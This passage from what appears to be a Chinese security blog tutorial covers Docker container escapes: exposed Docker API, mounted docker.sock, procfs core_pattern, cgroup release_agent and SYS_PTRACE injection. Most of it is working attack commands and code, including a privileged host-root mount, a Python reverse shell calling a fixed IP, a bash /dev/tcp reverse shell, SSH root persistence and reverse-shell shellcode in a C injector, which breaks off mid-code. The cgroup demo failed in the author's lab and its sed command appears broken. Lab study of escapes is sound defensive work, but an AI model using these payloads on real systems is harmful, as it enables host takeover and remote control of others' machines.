+<p>修改宿主机的 <code>/etc/ssh/sshd_config</code> 文件设置一下参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PubkeyAuthentication yes</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p>设置好之后 即可通过私钥进行连接，获取宿主机 root 权限，逃逸成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i 私钥文件 root@ip</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Docker-API未授权"><a href="#Docker-API未授权" class="headerlink" title="Docker API未授权"></a>Docker API未授权</h3><p>Docker Remote API是一个取代远程命令行界面(RCLI)的REST API，当该接口直接暴漏在外网环境中且未作权限检查时，可以直接通过恶意调用相关的API进行远程命令执行 实现逃逸。</p>
+<p>我们直接用vulhub的环境。</p>
+<p>当我们访问<code>http://156.238.233.113:2375/</code>时，返回<code>&#123;&quot;message&quot;:&quot;page not found&quot;&#125;</code>代表存在漏洞</p>
+<p>在此之前，我们先说一下利用环境：通过对宿主机端口扫描，发现有<code>2375</code>端口开放，可以执行任意docker命令。我们可以据此，在宿主机上运行一个容器，然后将宿主机的根目录挂载至docker的<code>/mnt</code>目录下，便可以在容器中任意读写宿主机的文件了。我们可以将命令写入<code>crontab</code>配置文件，进行反弹shell。</p>
+<p>使用 &#x2F;version、&#x2F;info 接口可以查看其他信息</p>
+<p>创建一个 busybox:latest 镜像（轻量级），并在启动时设置参数，将宿主机的目录挂载到 镜像中的 &#x2F;tmp 目录中</p>
+<p>（注意这里的busybox镜像是在vulhub容器之中的docker！）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://156.238.233.113:2375 run --rm --privileged -it -v /:/mnt busybox chroot /mnt sh</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>–rm 容器停止时，自动删除该容器</p>
+<p>–privileged 使用该参数，container内的root拥有真正的root权限。否则，container内的root只是外部的一个普通用户权限。privileged启动的容器，可以看到很多host上的设备，并且可以执行mount。甚至允许你在docker容器中启动docker容器。</p>
+<p>-v 挂载目录。格式为 系统目录:容器目录</p>
+<p>chroot就是把根目录切换到&#x2F;mnt，最后的sh就是我们使用的shell。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508123913422.png" alt="image-20250508123913422"></p>
+<p>因为这里宿主机环境是vulhub的docker靶场，仍然为docker环境，所以暂不演示写入ssh公钥来进行权限维持，实际项目中宿主机为真实主机的情况下可以正常实现。</p>
+<h3 id="Docker-Socket逃逸"><a href="#Docker-Socket逃逸" class="headerlink" title="Docker Socket逃逸"></a>Docker Socket逃逸</h3><p>Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信，实现执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。</p>
+<p>也就是说如果这个文件被挂载了之后，就可以直接操作宿主机的docker服务，进行创建、修改、删除镜像，从而实现逃逸</p>
+<p>这里的思路就跟Docker API未授权有点像了！</p>
+<p>先准备一个环境</p>
+<p>启动镜像并挂载 &#x2F;var&#x2F;run&#x2F;docker.sock</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -v /var/run/docker.sock:/var/run/docker.sock --name my_ubuntu ubuntu:18.04</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508125804302.png" alt="image-20250508125804302"></p>
+<p>首先判断当前容器是否挂载了 Docker Socket，如下图，docker.sock 文件存在 则证明被挂载</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508125936639.png" alt="image-20250508125936639"></p>
+<p>由于Docker逃逸一般是在拿到shell并提权后进行的，这里我们讲解docker逃逸就跳过了前面的步骤，直接从docker容器的rce开始。</p>
+<p>看到docker.sock存在后，我们就可以开始进行逃逸了。</p>
+<p>接下来我们看看目标是否存在docker环境</p>
+<p>发现不存在，那么我们手动给他安装即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update  </span><br><span class="line">apt-get install curl  </span><br><span class="line">curl -fsSL https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508130956190.png" alt="image-20250508130956190"></p>
+<p>我们先看看docker images的结果，发现与宿主机docker images的结果一样！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508131628765.png" alt="image-20250508131628765"></p>
+<p>接着使用该客户端通过<code>Docker Socket</code>与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508131757989.png" alt="image-20250508131757989"></p>
+<p>逃逸成功！</p>
+<p>然后我们进行权限维持。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508133227214.png" alt="image-20250508133227214"></p>
+<p>成功弹回shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508133252371.png" alt="image-20250508133252371"></p>
+<h3 id="Docker-Procfs危险挂载"><a href="#Docker-Procfs危险挂载" class="headerlink" title="Docker Procfs危险挂载"></a>Docker Procfs危险挂载</h3><p>linux中的<code>/proc</code>目录是一个伪文件系统，其中动态反应着系统内进程以及其他组件的状态。如果 docker 启动时将 &#x2F;proc 目录挂载到了容器内部，就可以实现逃逸。</p>
+<p>前置知识：<br><code>/proc/sys/kernel/core_pattern</code>文件是负责 进程崩溃时 的内存数据转储，当第一个字符是管道符<code>|</code>时，后面的部分会以命令行的方式进行解析并运行。并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。<br>利用该解析方式，可以进行容器逃逸。</p>
+<p><strong>我们将要执行的exp文件写入&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_pattern，那么崩溃的时候就会去执行！</strong></p>
+<p>启动一个 ubuntu  镜像，启动时将宿主机的 <code>/proc/sys/kernel/core_pattern</code>文件挂载到容器<code>/meteorkai/</code> 目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v /proc/sys/kernel/core_pattern:/meteorkai/proc/sys/kernel/core_pattern ubuntu</span><br></pre></td></tr></table></figure>
+
+<p>判断 是否挂载了宿主机的 procfs，执行下面的命令，如果找到两个 <code>core_pattern</code> 文件那可能就是挂载了宿主机的 procfs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name core_pattern</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508162902326.png" alt="image-20250508162902326"></p>
+<p>第一个是容器本身的 procfs，第二个是挂载的宿主机的 procfs</p>
+<p>接下来找到当前容器在宿主机下的绝对路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@c41e1ec92154:/# cat /proc/mounts | xargs -d &#x27;,&#x27; -n 1 | grep workdir</span><br><span class="line">workdir=/var/lib/docker/overlay2/c6cf089ecf818c04c9b32b6be35655bd0760b2957cf73fd4c27b61ccd0dde9c4/work 0 0</span><br></pre></td></tr></table></figure>
+
+<p><strong>workdir</strong> 是分层存储的工作目录，而<strong>merged</strong> 是挂载点（即容器的文件系统视图）<br>将路径中的 <code>work</code> 替换为 <code>merged</code> 就是当前容器在宿主机上面的绝对路径<br>由下图可知 当前容器在宿主机上面的绝对路径 为：<code>/var/lib/docker/overlay2/c6cf089ecf818c04c9b32b6be35655bd0760b2957cf73fd4c27b61ccd0dde9c4/merged</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508163019064.png" alt="image-20250508163019064"></p>
+<p>我们在其中发现了meteorkai目录，正确了！</p>
+<p>在 &#x2F;tmp 目录下创建一个 .meteor.py 文件，此文件的功能是为了反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;/tmp/.meteor.py &lt;&lt; EOF</span><br><span class="line">#!/usr/bin/python3</span><br><span class="line">import os</span><br><span class="line">import pty</span><br><span class="line">import socket</span><br><span class="line">lhost = &quot;156.238.233.113&quot;</span><br><span class="line">lport = 4567</span><br><span class="line">def main():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), 0)</span><br><span class="line">    os.dup2(s.fileno(), 1)</span><br><span class="line">    os.dup2(s.fileno(), 2)</span><br><span class="line">    os.putenv(&quot;HISTFILE&quot;, &#x27;/dev/null&#x27;)</span><br><span class="line">    pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">    # os.remove(&#x27;/tmp/.meteor.py&#x27;)</span><br><span class="line">    s.close()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">	main()</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<p>注意接下来要给<code>.meteor.py</code>赋权才行，否则没有执行权限！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 .meteor.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508163602161.png" alt="image-20250508163602161"></p>
+<p>前面已经知道当前容器在宿主机内的绝对路径，故而可知当前文件在宿主机内的绝对路径为<code>/var/lib/docker/overlay2/c6cf089ecf818c04c9b32b6be35655bd0760b2957cf73fd4c27b61ccd0dde9c4/merged/tmp/.meteor.py</code></p>
+<p>将此路径写入到 宿主机的 <code>/proc/sys/kernel/core_pattern</code> 文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;|/var/lib/docker/overlay2/c6cf089ecf818c04c9b32b6be35655bd0760b2957cf73fd4c27b61ccd0dde9c4/merged/tmp/.meteor.py\rcore &quot; &gt;  /meteorkai/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
+
+<p>这里是利用 <code>/proc/sys/kernel/core_pattern</code> 在系统崩溃时会自动运行，给他指定运行的脚本路径为创建的恶意脚本文件路径，通过这种方式，一旦程序发生崩溃，就会自动运行该脚本，进行反弹宿主机 shell，实现逃逸。</p>
+<p>接下来就是想办法去让 docker崩溃，诱导系统加载 <code>core_pattern</code> 文件</p>
+<p>创建一个恶意文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main(void)  &#123;</span><br><span class="line">	int *a  = NULL;</span><br><span class="line">	*a = 1;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508164103522.png" alt="image-20250508164103522"></p>
+<p>使用 gcc 进行编译，需要使用到gcc环境，如果机器上面没有 gcc环境可以找个同核的机器编译好上传上去。<br>这里我直接在靶场环境中 安装了 gcc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update -y &amp;&amp; apt-get install vim gcc -y</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure>
+
+<p>编译完成之后 攻击机 vps 开启监听，docker中运行 恶意程序使 docker 崩溃</p>
+<p>给exp文件赋权后运行即可。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508164147430.png" alt="image-20250508164147430"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508164235931.png" alt="image-20250508164235931"></p>
+<p>成功反弹shell！</p>
+<h3 id="Cgroup配置错误"><a href="#Cgroup配置错误" class="headerlink" title="Cgroup配置错误"></a>Cgroup配置错误</h3><blockquote>
+<p>以下探讨的cgroup均为cgroup-v1版本，cgroup-v2有些变化不适用于本次讨论</p>
+</blockquote>
+<p>Cgroups本质上是在内核中附加的一系列钩子（hook），当程序运行时，内核会根据程序对资源的请求触发相应的钩子，以达到资源追踪和限制的目的。在Linux系统中，Cgroups对于系统资源的管理和控制非常重要，可以帮助管理员更加精细化地控制资源的分配和使用</p>
+<p>Cgroups主要实现了对容器资源的分配,限制和管理</p>
+<p>这种攻击利用了<code>notify_on_release</code> 和 <code>release_agent</code> 这两个 Cgroup 的机制，用于在 Cgroup 子目录资源被清空时执行特定的动作 实现逃逸。感觉跟上面的Procfs危险挂载的逃逸的原理有点点点点像，Procfs是通过触发进程崩溃来引发docker逃逸。</p>
+<p>利用条件：</p>
+<blockquote>
+<ul>
+<li><p>以root用户身份在容器内运行</p>
+</li>
+<li><p>使用SYS_ADMINLinux功能运行</p>
+</li>
+<li><p>缺少AppArmor配置文件，否则将允许mountsyscall</p>
+</li>
+<li><p>cgroup v1虚拟文件系统必须以读写的方式安装在容器内</p>
+</li>
+</ul>
+</blockquote>
+<p>环境搭建：</p>
+<p>拉取一个 ubuntu 18.04 的镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --rm --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04</span><br></pre></td></tr></table></figure>
+
+<p><code>--cap-add=SYS_ADMIN</code>: 使用SYS_ADMINLinux功能运行<br><code>--security-opt apparmor=unconfined</code>:  禁用 <strong>AppArmor</strong> 安全模块的限制</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509114848544.png" alt="image-20250509114848544"></p>
+<p>在docker容器中 执行命令判断当前主机是否符合逃逸的利用条件<br>确保具备 <code>SYS_ADMIN</code> 权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep CapEff</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509115229118.png" alt="image-20250509115229118"></p>
+<p>判断容器内挂载了 Cgroup 文件系统，且为读写模式。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount | grep cgroup</span><br><span class="line">ls -l /sys/fs/cgroup</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509115342196.png" alt="image-20250509115342196"></p>
+<p>都满足条件之后进行利用<br>创建一个临时目录用于挂载 Cgroup 文件系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/meteorkai</span><br></pre></td></tr></table></figure>
+
+<p>挂载 Cgroup 文件系统到临时目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cgroup -o memory cgroup /tmp/meteorkai</span><br></pre></td></tr></table></figure>
+
+<p><code>-t</code> 用于指定文件系统类型。<code>cgroup</code> 表示要挂载的是一个 Cgroup 文件系统<br> <code>-o</code> 用来指定挂载选项。 <code>memory</code> 表明挂载的是与内存（Memory）相关的 Cgroup 子系统<br> <code>cgroup</code>:  指定要挂载的 Cgroup 文件系统的名称或设备</p>
+<p>但是！！这里我们报错了！！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509120722518.png" alt="image-20250509120722518"></p>
+<p>由于我们的cgroup是v2版本的，就不适用了！而且我们无法降低我们的cgroup版本，因为cgroup v1 还是 v2 是由宿主机的 Linux 内核决定的，而不是 Docker 镜像（如 ubuntu:18.04）决定的。</p>
+<p>但是我们可以意淫，继续实验。</p>
+<p>借用一下别人的图，挂载成功后是这样的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509120921953.png" alt="image-20250509120921953"></p>
+<p>在挂载点下创建一个名为 “conf” 的子目录，用于设置特定 Cgroup 的配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/test3/conf</span><br></pre></td></tr></table></figure>
+
+<p>启用通知机制，当 <code>conf</code> 子目录的任务（进程）清空时会触发内核动作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /tmp/test3/conf/notify_on_release</span><br></pre></td></tr></table></figure>
+
+<p>使用 sed 命令从 &#x2F;etc&#x2F;mtab 文件中解析出宿主机的路径前缀 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host_path=`sed -n &#x27;s/.*\perdir=[^,]*.*/\1/p&#x27; /etc/mtab`</span><br></pre></td></tr></table></figure>
+
+<p>这里我用我的vps来展示一下这个host_path大概是什么结果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509122013047.png" alt="image-20250509122013047"></p>
+<p>其实就是跟Procfs中一样的docker在宿主机中的路径。</p>
+<p><code>/etc/mtab</code>  记录了当前系统挂载的所有文件系统的信息，可以了解当前哪些设备或网络资源已经被挂载到文件系统中。</p>
+<p>通过获取宿主机的挂载路径，就可以在容器内部使用这个路径来操作宿主机上的文件<br>这个路径会被用于配置 <code>release_agent</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509121706261.png" alt="image-20250509121706261"></p>
+<p>设置 release_agent 为一个脚本的路径，通知事件触发时由内核执行该脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$host_path/cmd&quot; &gt; /tmp/test3/release_agent</span><br></pre></td></tr></table></figure>
+
+<p>创建反弹 shell 的脚本，并写入其内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;#!/bin/sh&#x27; &gt; /cmd </span><br><span class="line">echo &quot;bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&quot; &gt;&gt; /cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509122122075.png" alt="image-20250509122122075"></p>
+<p> 将当前 shell 的 PID 写入 &#x2F;tmp&#x2F;test3&#x2F;conf&#x2F;cgroup.procs 文件 ，意味着当前 shell 进程将被“添加”到这个 cgroup 中，其他的进程被清空只保留当前的shell进程。</p>
+<p>触发 notify_on_release，清空任务后，release_agent 自动执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;echo \$\$ &gt; /tmp/test3/conf/cgroup.procs&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>$$</code> 是一个特殊变量，它代表当前 shell 进程的 PID（进程 ID）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509122517193.png" alt="image-20250509122517193"></p>
+<p>同时要注意执行文件的<strong>赋权</strong>！</p>
+<p>攻击机 vps 监听对应端口，获得宿主机 shell，成功逃逸</p>
+<h3 id="SYS-PTRACE-进程注入"><a href="#SYS-PTRACE-进程注入" class="headerlink" title="SYS_PTRACE 进程注入"></a>SYS_PTRACE 进程注入</h3><p>用户授予了容器SYS_PTRACE权限，并且与宿主机共享一个进程命名空间(–pid&#x3D;host)，使得在容器内可以查看到宿主机的进程，并可以利用进程注入，反弹shell，从而实现逃逸。</p>
+<p>利用条件：</p>
+<blockquote>
+<p>1.容器有SYS_PTRACE权限</p>
+<p>2.与宿主机共享一个进程命名空间</p>
+<p>3.容器以root权限运行</p>
+</blockquote>
+<p>环境搭建如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --pid=host --cap-add=SYS_PTRACE ubuntu:18.04</span><br></pre></td></tr></table></figure>
+
+
+
+<p>判断容器是否有 <code>SYS_PTRACE</code> 权限</p>
+<blockquote>
+<ul>
+<li><p>如果输出中包含 <code>cap_sys_ptrace</code> 字段，说明容器具有该权限。 </p>
+</li>
+<li><p>如果没有 <code>cap_sys_ptrace</code>，说明容器缺少此能力。</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">capsh --print | grep cap_sys_ptrace</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509130045002.png" alt="image-20250509130045002"></p>
+<p>接下来判断是否与宿主机共享进程命名空间<br>如果能看到宿主机的进程（如 Docker 守护进程 <code>dockerd</code>），说明共享了宿主机的进程命名空间。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep dockerd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509130128981.png" alt="image-20250509130128981"></p>
+<p>条件均符合，那么接下来我们开始实验。</p>
+<p>下载进程注入的 c 文件<br><a target="_blank" rel="noopener" href="https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c">https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Mem Inject</span></span><br><span class="line"><span class="comment">  Copyright (c) 2016 picoFlamingo</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment">(at your option) any later version.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">GNU General Public License for more details.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment">along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *shellcode = </span><br><span class="line">	<span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\xb9\x02\x00\x11\xd7\x9c\xee\xe9\x71\x51\x48\x89\xe6&quot;</span></span><br><span class="line">	<span class="string">&quot;\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce&quot;</span></span><br><span class="line">	<span class="string">&quot;\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f&quot;</span></span><br><span class="line">	<span class="string">&quot;\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48&quot;</span></span><br><span class="line">	<span class="string">&quot;\x89\xe6\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">inject_data</span> <span class="params">(<span class="type">pid_t</span> pid, <span class="type">unsigned</span> <span class="type">char</span> *src, <span class="type">void</span> *dst, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span>      i;</span><br><span class="line">  <span class="type">uint32_t</span> *s = (<span 